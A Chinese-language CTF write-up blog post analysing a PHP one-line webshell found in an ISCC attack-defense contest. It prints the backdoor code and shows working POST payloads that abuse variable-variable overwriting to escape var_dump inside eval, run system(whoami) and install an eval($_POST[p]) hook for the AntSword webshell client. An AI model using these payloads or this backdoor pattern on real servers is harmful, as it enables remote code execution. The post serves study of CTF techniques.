---
title: "一个有趣的PHP一句话"
date: 2019-06-30T13:29:56+08:00
draft: false
tags: ['php','shell']
categories: ['代码审计']
---
在iscc线下赛awd中遇到了一个shell，挺有意思，记录一下。
<!--more-->
源代码是这样的。其实刚拿到这个shell的时候我挺蒙的，不知道该怎么去利用，然后分析了一下，发现其实也还简单，下面我们一起来看下。

```php
<?php
show_source(__FILE__);
$a = @$_REQUEST['a'];
@eval("var_dump($$a);");
```

首先从请求中拿到`$a`参数，然后经过一次`var_dump`输出`$$a`的值，最后交给`eval`去执行。

那么显然`eval`的参数我们是可以控制的，关键的点就在于怎么去控制`var_dump`函数输出的内容。

我们先来看下var_dump函数的效果

```php
$a= 'phpinfo();';
var_dump($a);
浏览器输出
E:\code\php\1.php:8:string 'phpinfo();' (length=10)
```

可以看出来他会把变量的类型和变量的值都输出出来。

然后我们回头来看`$$`，在之前的文章中提到过，`$$`是存在变量覆盖的，那么我们可以通过`$$`来把`a`变量覆盖为我们想要的值。

![](https://y4er.com/img/uploads/20190630134606.png)

可以看到，当我们post提交`a=a=1`是，`$a`的值被覆盖为1，此时`eval`执行的是`eval("var_dump($a=1);")`

那么我们继续构造payload，闭合`var_dump`来拼接我们自己的函数。

```http
post
a=a=1);system(whoami
```

![](https://y4er.com/img/uploads/20190630135147.png)

利用成功！

那么怎么让蚁剑也能用这个shell呢？继续修改我们的payload

```http
post
a=a=1);eval($_POST[p]);//
```

然后蚁剑配置

![](https://y4er.com/img/uploads/20190630135604.png)

密码是p。这样就能连上蚁剑了。



s1ye师傅提出了另一种思路`${}`。~~他个臭嗨又偷偷看我文章~~

![](https://y4er.com/img/uploads/20190707175856.png)